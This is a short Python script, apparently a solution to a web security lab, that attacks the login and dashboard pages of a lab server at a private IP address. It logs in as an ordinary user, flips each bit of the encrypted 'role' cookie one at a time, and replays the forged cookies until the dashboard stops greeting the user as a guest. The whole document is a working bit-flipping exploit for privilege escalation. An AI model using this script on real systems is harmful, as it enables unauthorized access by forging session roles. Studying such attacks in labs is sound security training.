from binascii import unhexlify,hexlify
import requests
import re

data = {'username':'user','password':'user'}
respuesta = requests.post('http://10.201.103.253/labs/lab4/challenge.php',data=data,allow_redirects=False)
role = re.findall('role=([0-9A-Za-z]+)',respuesta.headers['Set-Cookie'])
auth = re.findall('auth_token=([0-9A-Za-z]+)',respuesta.headers['Set-Cookie'])
PHPSESSID = re.findall('PHPSESSID=([0-9A-Za-z]+)',respuesta.headers['Set-Cookie'])
cookie_original = unhexlify(f"{role[0]}")
n_bytes = len(cookie_original)
cookies = []
for i in range(n_bytes):
	for bit in range(8):
		byte_modificado = (cookie_original[i] ^ (1 << bit)).to_bytes(1)
		new = cookie_original[:i]+byte_modificado+cookie_original[i+1:]
		cookies.append(new.hex())
for i in cookies:
	headers = {"Cookie":f"PHPSESSID={PHPSESSID[0]}; auth_token={auth[0]}; role={i}"}
	respuesta = requests.get('http://10.201.103.253/labs/lab4/dashboard.php',headers=headers)
	if "Guest!" not in respuesta.text:
		print(f"La data cifrada manipulada de la cookie 'role' es el siguiente: {i}")
		print(respuesta.text)
		break
